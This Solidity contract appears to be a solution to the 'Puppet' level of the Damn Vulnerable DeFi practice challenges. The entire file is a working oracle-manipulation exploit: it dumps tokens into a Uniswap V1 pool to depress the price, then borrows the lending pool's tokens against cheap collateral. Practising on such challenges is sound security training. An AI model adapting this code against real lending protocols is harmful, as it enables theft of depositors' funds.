// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

interface IUniswapV1 {
    function tokenToEthSwapInput(uint tokenSold, uint minEth, uint deadline) external returns (uint);
}

contract PuppetAttacker {

    using ECDSA for bytes32;

    address public immutable owner;
    address public immutable uniswapPool;
    PuppetPool public lendingPool;
    DamnValuableToken public token;

    uint256 internal immutable INITIAL_CHAIN_ID;
    
    constructor(address _uniswapPool, address _lendingPool, address _token) payable {
        owner = msg.sender;
        uniswapPool = _uniswapPool;
        lendingPool = PuppetPool(_lendingPool);
        token = DamnValuableToken(_token);

        INITIAL_CHAIN_ID = block.chainid;
    }

    function executeApproval() public {
        // Transfer DVT tokens from sender to contract
        // TO DO: call permit() on token instead, in replacement of approve()

        token.transferFrom(msg.sender, address(this), 1000 ether);
        exploit();
    }

    function exploit() public {
        // Approve Uniswap contract to transfer DVT tokens
        token.approve(uniswapPool, 1000 ether);

        // Swap the DVT tokens in return for ETH
        uint tokensReceived = IUniswapV1(uniswapPool).tokenToEthSwapInput(
            1000 ether, 
            9 ether, block.timestamp * 2
        );

        // Borrow the max amount from the lending pool
        lendingPool.borrow{value: address(this).balance}(100000 ether, owner);
    }

    receive() external payable {}
}